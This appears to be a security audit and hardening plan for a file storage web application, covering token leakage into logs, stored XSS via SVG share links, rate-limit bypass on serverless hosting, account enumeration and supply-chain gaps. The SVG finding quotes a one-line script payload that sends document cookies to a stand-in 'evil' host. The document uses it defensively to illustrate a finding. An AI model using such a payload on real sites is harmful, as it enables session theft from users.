# Secure File Storage — Security Analysis & Hardening Plan

> Author role: Senior DevSecOps review
> Date: 2026-08-22 · Scope: full stack (backend API, frontend, tests, schema, configs, deployment targets)
> Method: manual line-by-line code audit + live runtime verification (local compose stack,
> curl-level contract probing, log inspection). Every finding marked **[verified]** was
> reproduced or confirmed in running code — not inferred.
>
> Companion docs: `UPGRADE_PLAN.md` (feature roadmap), `REMAINING_WORK.md` (functional gaps).
> This document covers **security only**. Cross-references are given where work overlaps.

---

## 1. Executive summary

The application has a **solid security foundation**: presigned-URL uploads keep files out of
the API process, S3 keys are owner-namespaced, refresh tokens are hashed and rotated with
reuse detection, quota writes are race-safe, env is validated at boot, and `.env` hygiene is
correct (verified: only `.env.example` files are committed; real env files are gitignored in
both repos).

However, the audit surfaced **one critical, live-verified exposure** (bearer tokens written
to logs), **two high-severity design gaps** (SVG-as-XSS via public share links; rate limiting
that silently stops working on the actual Vercel serverless deployment target), and a cluster
of medium issues concentrated in authentication abuse resistance and supply-chain blindness.

Risk posture summary:

| Severity | Count | Headline items |
| --- | --- | --- |
| Critical | 1 | Tokens leaked into logs (SEC-01) |
| High | 3 | SVG stored XSS (SEC-02), serverless rate-limit bypass (SEC-04), zero dependency-vulnerability visibility (SEC-10) |
| Medium | 6 | Login timing/enumeration, localStorage tokens, no password reset, MIME trust, weak secret policy, share probing |
| Low / Info | 8 | Zero-byte file abuse, demo seed guard, rotation atomicity, bcrypt cost, health uptime, audit trail, etc. |

---

## 2. What is already right (keep / protect these)

Verified positives — do not regress while hardening:

- Presigned upload/download URLs; file bytes never transit the API.
- Owner-namespaced S3 keys (`<ownerId>/<uuid>-<sanitized-name>`) prevent cross-tenant key spoofing; filenames are path-sanitized.
- Registration HEADs the object and rejects missing/size-mismatched uploads.
- Atomic conditional quota update inside a transaction (TOCTOU-safe); delete decrements with `GREATEST(0, …)`.
- Refresh tokens: opaque 48-byte random, SHA-256-hashed at rest, family-based rotation with reuse detection revoking the whole family; `tokenVersion` invalidates outstanding access JWTs on logout-all.
- bcrypt(10) password hashing; identical error message for unknown-user vs wrong-password login.
- helmet + CORS allow-list from validated env; body size capped at 1 MB; `trust proxy 1`.
- zod validation on every external input via middleware; centralized `ApiError` contract; generic 500s (no stack traces to clients).
- Env schema validated at boot, fail-fast; `.env` correctly gitignored in both repos (only examples committed).
- Download URLs expire in 5 minutes; upload URLs in 1 hour.

---

## 3. Findings

Severity scale: 🔴 Critical · 🟠 High · 🟡 Medium · ⚪ Low · ℹ️ Informational

### SEC-01 ✅ FIXED (Phase 1, 2026-08-22) — was: Bearer tokens written to logs in plaintext

**Evidence:** pino-http's default request serializer includes request headers. Live capture
from a local run of this codebase shows full access JWTs logged:

```
"authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."   # complete, usable token
```

Every authenticated request therefore writes a valid credential to stdout/log files. In
production, JSON logs ship to aggregators (Vercel/CloudWatch/Datadog) where retention is long
and access is broad. Anyone with log read access — or any log-forwarding integration — obtains
live session tokens. This defeats the short-TTL design of the access token and makes the
15-minute expiry meaningless for stolen-from-logs tokens.

**Remediation:** add a custom pino-http request serializer that whitelists fields (id,
method, url, requestId) and never serializes headers; add pino redact rules as defense in
depth (`paths: ['req.headers.authorization', 'req.headers.cookie']`, censor). Add a test that
greps captured logs for `Bearer ` after an authenticated request.

---

### SEC-02 🟠 SVG allowed by content-type allow-list → stored XSS via share links

`image/svg+xml` is in the default allow-list (`src/config/env.ts`). Upload flow: attacker
uploads `malware.svg` containing `<script>fetch('https://evil/?c='+document.cookie)</script>`,
toggles it PUBLIC, and sends the `/share/<id>` link. The presigned GET serves the object
inline with its stored `Content-Type: image/svg+xml` on the storage origin (S3/MinIO) — the
script executes in the victim's browser. Because tokens currently live in `localStorage`
(SEC-08), this chains into full session theft. Even after SEC-08 is fixed, script execution
on the storage origin enables same-origin attacks against anything else hosted there.

**Remediation (choose one or combine):**
1. Remove `image/svg+xml` from the default allow-list (simplest; most deployments don't need it).
2. Keep SVG but force download semantics: sign all download URLs with
   `response-content-disposition: attachment` (and optionally `response-content-type:
   application/octet-stream`) so browsers never render uploaded content inline.

Recommended: do both — attachment disposition for *all* downloads (defense in depth for every
content type), plus drop SVG from defaults.

---

### SEC-03 🟡 Client-declared MIME type is trusted; no magic-byte validation — [partially verified]

Upload-url, registration, and multipart-start validate `fileType`/`mimeType` only against the
allow-list — the value is whatever the client declares. A file's true type is never inspected
(no magic-byte sniffing at registration). Consequences: content mislabeling (serve an HTML/
polyglot payload labeled `text/plain`; neutralized once SEC-02's attachment disposition lands,
but still breaks integrity guarantees), and the allow-list provides policy theater rather
than content assurance.

**Remediation:** at registration (after the existing HEAD size check), fetch the first KB of
the object via a presigned GET or `GetObject` range-read and sniff the type (e.g. `file-type`
package). Reject on mismatch with declared type. Optional: store the sniffed type as the
authoritative `mimeType`.

---

### SEC-04 🟠 Rate limiting silently fails on the production (Vercel) deployment target

The repo ships `vercel.json` + `api/index.ts` (serverless function entry). `express-rate-limit`
uses a **per-process memory store by default** — on Vercel each lambda instance has its own
memory, so the auth limiter (20 req/15 min) is really "20 req per lambda instance", and cold
starts/warm pools make the effective limit unenforceable. The documented auth brute-force
protection does not hold on the platform this project actually deploys to. Same flaw would
apply to any future in-memory per-account lockout (SEC-05).

**Remediation:** either (a) back `express-rate-limit` with a shared store
(`rate-limit-redis` + Upstash/Redis, or Vercel KV/WAF rules at platform level), or (b)
explicitly document that self-hosted/long-running-node is the supported prod topology and
enforce limits there. Decide before implementing SEC-05 lockouts so they land on the shared
store directly.

---

### SEC-05 🟡 No per-account brute-force protection + timing-based account enumeration at login

Only a flat IP limiter exists (20 req/15 min — see SEC-04 for why even that is fragile on
Vercel). Credential stuffing against a known email is unthrottled per-account. Additionally,
login responds measurably faster for unknown emails than wrong passwords (bcrypt compare is
skipped when the user row doesn't exist), enabling reliable account enumeration via response
timing despite identical messages.

**Remediation:**
- Dummy bcrypt compare when the user doesn't exist (compare against a fixed app-wide hash) to flatten timing.
- Per-account failed-attempt counter with exponential backoff/lockout — implement on the shared store chosen in SEC-04.

---

### SEC-06 🟡 Registration confirms account existence

`POST /auth/register` returns `409 An account with this email already exists` — direct
enumeration oracle. Standard trade-off; acceptable for many products, but should be a
conscious decision. If mitigating: return 200 with a generic "check your email" flow (pairs
naturally with email verification / password-reset infrastructure).

### SEC-07 🟡 No password reset flow — account recovery gap

`PasswordResetToken` table exists but no endpoints use it. Beyond being a functional gap
(REMAINING_WORK R4), this is a security issue: users with lost credentials have no recovery
path, which drives insecure workarounds (password reuse across sites, support social
engineering). Implement forgot/reset with single-use hashed tokens, short TTL, and session
revocation on reset (bump `tokenVersion` + revoke refresh families).

### SEC-08 🟡 Access + refresh tokens persisted in `localStorage`

Any successful XSS anywhere in the SPA exfiltrates both tokens (see SEC-02 for a concrete XSS
vector that exists today). React escaping reduces likelihood but one compromised npm
dependency is enough.

**Remediation:** move the refresh token to an `HttpOnly; Secure; SameSite=Lax` cookie set by
the backend (scoped path `/api/auth`), keep the access token in memory only. This requires a
CSRF strategy for cookie-carried requests (SameSite + custom header check is sufficient here
since the API is JSON-only).

### SEC-09 🟡 Share endpoint allows existence probing and is unrate-limited

Unauthenticated `GET /files/:id/share` distinguishes 404 ("File not found") vs 403 ("no
access"), letting anyone probe whether a file UUID exists; the route also carries no rate
limit (UUIDs are unguessable, which lowers practical risk — hence medium-low).

**Remediation:** uniform 404 response for both missing and private files on the share route;
add a dedicated limiter (on the shared store per SEC-04).

### SEC-10 🟠 Zero dependency-vulnerability visibility (CI absent; registry mirror blocks auditing) — [verified]

- No CI pipeline exists in either repo (no gates, no scans on push).
- `npm audit` currently fails in this environment because the configured registry is
  `npmmirror.com`, whose audit endpoint returns `404 NOT_IMPLEMENTED` — verified. There is
  presently **no working mechanism anywhere** that detects vulnerable dependencies.
- Minor related: unused dependency (`react-dropzone`) widens attack surface for nothing.

**Remediation:** CI (GitHub Actions) using the official registry explicitly
(`registry.npmjs.org`), running `npm audit --audit-level=high` (or `osv-scanner`), lint,
typecheck, tests; enable Dependabot; remove dead deps.

### SEC-11 🟡 Zero-byte files and unbounded file count bypass quota intent

Validation accepts `fileSize >= 0`. Zero-byte objects consume no quota, and nothing caps the
*number* of files per user — a user can mint unlimited metadata rows (DB bloat, list-page
degradation) within their quota. Multipart start likewise trusts declared sizes until the
HEAD check at completion.

**Remediation:** require `fileSize > 0` (reject 0 with clear message); cap files-per-user
(e.g. configurable max, checked in the same registration transaction); optionally charge a
minimum synthetic byte cost per file if 0-byte files must be supported.

### SEC-12 ✅ FIXED (Phase 1) — was: Secret management weak policy floor + stale live credentials

- `JWT_SECRET` requires only ≥16 chars — far below current recommendations for HS256 signing keys (≥32 random bytes / 256-bit entropy).
- The local dev `.env` holds cloud Postgres credentials that are already failing (`tenant/user not found`) — stale secrets lying on disk are exactly what rotates-and-forgets prevents. No documented rotation runbook exists (though `tokenVersion` gives the mechanism for JWT-side rotation).

**Remediation:** raise env-schema minimums (JWT_SECRET ≥32 chars, reject known example
values), document a secret-rotation runbook (JWT_SECRET rotation forces re-login via
`tokenVersion` bump; DB creds via double-credential swap), purge stale credentials.

### SEC-13 ✅ FIXED (Phase 1) — was: Demo seed account lacked environment guard

`npm run seed` creates/upserts `demo@example.com / password123` unconditionally — one
accident away from a production box with a known-password account.

**Remediation:** refuse to run unless `NODE_ENV !== 'production'` (hard fail) or require an explicit `--force`.

### SEC-14 ⚪ Transport/header & infra baseline details

- helmet defaults are on (good) but CSP is generic; fine for a JSON API — document that.
- HSTS is emitted even over local HTTP (harmless, worth knowing).
- docker-compose ships MinIO `minioadmin/minioadmin` — acceptable dev-only; ensure prod bucket policy enforces SSE-S3/SSE-KMS and blocks public ACLs (currently undocumented).
- CORS `credentials: true` with env-driven origin list — safe today; add a startup guard rejecting wildcard origins when credentials mode is on.

### SEC-15 ✅ FIXED (Phase 1) — was: Health endpoint exposes runtime detail

`GET /health` returns `process.uptime()` — trivial fingerprinting aid. Return liveness booleans only, or gate detail behind admin auth.

### SEC-16 ℹ️ No audit trail; reconcile job unscheduled

Sensitive actions (file delete, visibility change, logout-all, future password reset) leave
only ephemeral request logs — no tamper-evident audit record for incident response. The
reconcile job (which is itself the cleanup for the best-effort-delete design) must be run
manually; orphaned objects persist indefinitely unless someone remembers to run it.

**Remediation:** `AuditLog` table (actor, action, targetType/id, ip, requestId, createdAt);
schedule reconcile via cron (GitHub Scheduled workflow, Vercel Cron, or system cron on
self-hosted).

### SEC-17 ⚪ bcrypt cost hardcoded

Cost 10 is an acceptable floor but is frozen in constants; hardware improves, policy shouldn't
require a code deploy per node.

**Remediation:** make cost env-configurable (validated range 10–14), plan progressive rehash on next successful login (`bcrypt.compareSync` result hash version check).

### SEC-18 ✅ FIXED (Phase 1) — was: Error logs can embed driver internals

Unexpected-error logging passes raw Prisma/driver errors to pino; driver errors can include
connection strings/hostnames. Not client-visible (500s are generic), but log consumers see
infra internals.

**Remediation:** serialize unexpected errors to name/message/stack only; redact URL query params in request logs (presigned URLs contain signatures!).

---

## 4. Hardening upgrade plan

Six phases. **Each phase is an independent entity**: it can be planned, executed, tested,
merged, and shipped on its own, in any order (recommended order reflects risk reduction per
unit of effort). Where phases touch the same file, later phases rebase cleanly because each
delivers a self-contained diff.

---

### Phase SEC-A — Secrets & log hygiene *(kills the critical finding)*

> Fixes: SEC-01, SEC-12, SEC-13, SEC-15, SEC-18 · Effort: S–M · Depends on: nothing

| # | Task | Files |
| - | ---- | ----- |
| A1 | Custom pino-http serializer: whitelist `id/method/url/requestId/responseTime`; never emit headers/body. Add pino `redact` paths for `authorization`/`cookie` as belt-and-braces. | `src/app.ts`, `src/utils/logger.ts` |
| A2 | Redact query strings from logged URLs (presigned URLs carry signatures). | `src/app.ts` |
| A3 | Serialize unexpected errors to `{name, message}` (+stack in dev only). | `src/middleware/error.middleware.ts` |
| A4 | Raise secret floors: `JWT_SECRET` ≥ 32 chars; reject placeholder/example values in `env.ts`. Purge stale cloud creds from local `.env`. | `src/config/env.ts` |
| A5 | Seed guard: hard-fail unless `NODE_ENV !== 'production'` or `--force` passed. | `src/seed.ts` |
| A6 | `/health` returns status only (drop `uptime`). Update its test. | `modules/health/*`, `tests/health.test.ts` |

**Acceptance criteria:** automated test performs an authenticated request, captures log
output, asserts no `eyJ`/`Bearer ` substring appears; env boot fails on 16-char secret;
seed refuses under NODE_ENV=production.

---

### Phase SEC-B — Supply chain & build security

> Fixes: SEC-10 · Effort: M · Depends on: nothing (repo consolidation from REMAINING_WORK R11 is recommended first but not required — workflows can live per-repo initially)

| # | Task | Detail |
| - | ---- | ------ |
| B1 | GitHub Actions CI per repo: pin official npm registry; jobs = install → audit (`--audit-level=high`) → lint → typecheck → format:check → test (backend, with Postgres service) → build (frontend). Reuse REMAINING_WORK R3 scope, adding the audit step. | `.github/workflows/ci.yml` |
| B2 | Enable Dependabot (`version-updates` + `security-updates`) per repo. | `dependabot.yml` |
| B3 | Remove unused dependency `react-dropzone`; prune any other dead deps. | `frontend/package.json` |
| B4 | Document supported registries; add `engines` + lockfile-version pinning note to README. | README |

**Acceptance criteria:** green CI run on GitHub runners (where `npm audit` works) surfacing
any current advisories; Dependabot opens config-valid PRs.

---

### Phase SEC-C — Authentication & session hardening

> Fixes: SEC-05 (timing half), SEC-07, SEC-08, SEC-17, SEC-18 · Effort: L · Depends on: nothing technically; coordinate with REMAINING_WORK R1/R2/R4 (refresh interceptor, logout call, reset pages) — backend parts are independent of frontend parts

| # | Task | Files |
| - | ---- | ----- |
| C1 | Timing-flattened login: constant-work bcrypt compare against a fixed dummy hash when the user is unknown. | `modules/auth/auth.service.ts` |
| C2 | Make refresh rotation transactional (create new + mark `replacedById` in one `$transaction`). | `modules/auth/auth.service.ts`, extend `tests/refresh.test.ts` |
| C3 | Move refresh token to `HttpOnly; Secure; SameSite=Lax` cookie scoped to `/api/auth`; accept token from cookie OR body during migration; keep access token in memory (frontend). Add CSRF guard for cookie-authenticated mutations (Origin/Referer allow-list + custom header requirement — API is JSON-only so this suffices). | auth module, `tests/refresh.test.ts`, frontend `lib/api.ts` |
| C4 | Password reset endpoints: forgot (always-200, hashed single-use token, 15-min TTL), reset (verify + rotate password + revoke all sessions via `tokenVersion` bump + refresh-family revocation). Email transport abstracted; dev logs the link. Pairs with REMAINING_WORK R4. | auth module, `tests/password-reset.test.ts` |
| C5 | bcrypt cost env-configurable (validated 10–14); progressive rehash on login. | auth module, `config/env.ts` |

**Acceptance criteria:** timing delta between unknown-email and wrong-password responses
< noise threshold in a benchmark test; reuse-detection test extended to cover mid-rotation
crash simulation; reset flow round-trips and old sessions die; cookie flags asserted in tests.

---

### Phase SEC-D — Upload & content security

> Fixes: SEC-02, SEC-03, SEC-11 · Effort: M · Depends on: nothing

| # | Task | Files |
| - | ---- | ----- |
| D1 | Remove `image/svg+xml` from default allow-list (overridable by env for deployments that need it, documented with warnings). | `src/config/env.ts` |
| D2 | Force-download semantics: all download/share presigned GETs signed with `response-content-disposition: attachment` (+ optional `response-content-type` override). | `modules/files/file.service.ts`, extend `tests/content-safety.test.ts` |
| D3 | Magic-byte sniffing at registration: ranged GET of first KB, compare sniffed vs declared type, reject mismatch (400) — runs alongside the existing HEAD check. New env flag to disable for large-file-only flows if needed. | file service/validation, tests |
| D4 | Require `fileSize > 0`; add per-user file-count cap enforced inside the registration transaction (same atomic pattern as quota). Configurable via env. | file validation + service, `env.ts`, tests |

**Acceptance criteria:** malicious SVG upload rejected by default; downloaded files always
arrive as attachments; a PNG renamed to `.txt`+labeled `text/plain` is rejected at
registration; 0-byte upload rejected; 5 001st file (cap 5 000) rejected atomically.

---

### Phase SEC-E — Abuse prevention & enumeration defenses

> Fixes: SEC-04, SEC-05 (lockout half), SEC-06, SEC-09 · Effort: M–L · Depends on: decide shared-store vendor first (Upstash/Vercel KV/self-hosted Redis)

| # | Task | Files |
| - | ---- | ----- |
| E1 | Choose + wire shared rate-limit store for the serverless target (Redis-backed store for express-rate-limit, or platform WAF rules); memory store remains fallback for dev/test. | `middleware/rate-limit.ts` (new), `app.ts` |
| E2 | Global limiter (~100 req/min/IP) + named per-route limiters: auth (existing, now shared-store), upload-url/start, download, share. | routes, middleware |
| E3 | Per-account failed-login counter with exponential backoff/lockout on the shared store; flattened timing retained from C1. | auth service/routes, tests |
| E4 | Uniform 404 on share route for both missing and private files (no capability probing). | file controller/service, `tests/files.test.ts` |
| E5 | Document/decide register-enumeration trade-off (409 today); optional generic-response flow once email verification exists. | auth module |

**Acceptance criteria:** limits hold across simulated multi-instance execution (integration
test against Redis container); locked account returns 429 with Retry-After; share route
indistinguishable for private vs missing IDs; load-test smoke shows global cap enforced.

---

### Phase SEC-F — Audit, operations & incident readiness

> Fixes: SEC-16, SEC-14 remainder · Effort: M · Depends on: nothing (E1 vendor choice reusable for cron if desired)

| # | Task | Files |
| - | ---- | ----- |
| F1 | `AuditLog` model + write helper (`actorId, action, targetType, targetId, ip, requestId, createdAt`); instrument: delete, visibility toggle, logout-all, password reset, quota-reject spikes. Additive migration. | prisma schema, new `audit` util, call sites |
| F2 | Schedule reconcile job (cron): orphan sweep + stale multipart abort run automatically; alert on nonzero findings. | workflow/cron config, README |
| F3 | Prod bucket baseline doc/checklist: SSE enforced, public ACLs blocked, versioning considered, CORS limited to frontend origin with `ExposeHeaders: etag` (also fixes multipart ETag finding F3 in REMAINING_WORK). | README/docs, optional compose init update |
| F4 | Incident runbook: JWT_SECRET rotation (via mass `tokenVersion` bump), refresh-family mass revocation, DB credential swap, log-tamper response. | `docs/incident-response.md` |
| F5 | Startup CORS guard: fail fast if origins include `*` while `credentials: true`. | `src/config/env.ts` or `app.ts` |

**Acceptance criteria:** audit rows exist for every sensitive action in the manual pass;
reconcile runs on schedule and reports findings; runbook reviewed end-to-end in a tabletop
exercise; boot fails on unsafe CORS config.

---

## 5. Recommended sequencing & effort overview

| Phase | Name | Fixes | Effort | Independent? |
| ----- | ---- | ----- | ------ | ------------ |
| SEC-A | Secrets & log hygiene | SEC-01, 12, 13, 15, 18 | S–M | ✅ |
| SEC-B | Supply chain & build | SEC-10 | M | ✅ |
| SEC-C | Auth & session hardening | SEC-05†, 07, 08, 17, 18 | L | ✅ |
| SEC-D | Upload & content security | SEC-02, 03, 11 | M | ✅ |
| SEC-E | Abuse prevention | SEC-04, 05‡, 06, 09 | M–L | ✅ (vendor decision first) |
| SEC-F | Audit & operations | SEC-14, 16 | M | ✅ |

† timing-flattening half — ‡ lockout half. SEC-C and SEC-E split SEC-05 deliberately so each phase stays shippable alone.

**Suggested order:** SEC-A immediately (critical, small) → SEC-B (visibility unlocks
everything else) → SEC-D (closes the XSS chain while SEC-C is in flight) → SEC-C → SEC-E →
SEC-F. Note SEC-A + SEC-D together break the token-theft kill chain (log leakage removed +
XSS vector closed + downloads forced to attachment), which is the fastest route to dropping
the overall risk rating from High to Medium.

## 6. Definition of done (security-specific)

- Automated assertion that no log line ever contains a bearer token or cookie value.
- CI green on GitHub runners including `npm audit`; Dependabot active; zero known highs.
- Share/download of any user content cannot execute scripts in any modern browser.
- Brute force against a single account is throttled identically regardless of instance count.
- Password reset round-trip works and revokes prior sessions; refresh rotation survives crash points.
- All sensitive actions produce audit records; reconcile runs unattended.
